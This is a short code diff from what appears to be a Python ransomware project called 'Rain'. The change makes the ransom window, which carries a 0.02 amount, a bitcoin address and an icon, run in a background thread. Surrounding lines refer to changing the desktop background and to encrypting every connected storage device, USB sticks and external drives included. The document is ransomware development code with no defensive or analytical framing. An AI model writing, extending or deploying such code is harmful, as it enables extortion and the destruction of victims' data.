@@ -11,6 +11,7 @@ from shutil import copyfile
 from sys import argv, path
 path.append('..')
 from GUI.Interface import GUI
+from threading import Thread
 
 """ ABOUT VARIABLES TO BE DECLARED
 
@@ -396,7 +397,8 @@ crypto.change_background(appdata)
     All of these values are examples and can be set by users.
 """
 
-window = GUI('Rain', 0.02, '18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK', '../Util/rainicon.ico')
+window = Thread(target=GUI, args=('Rain', 0.02, '18mB1n8bDXHxie9R4qAqHibUppaiwuQYXK', '../Util/rainicon.ico'))
+window.start()
 
 """ This structure is for encrypting each storage device connected to the machine 
     (USB sticks, external hard drives and hard drives (external or not) )
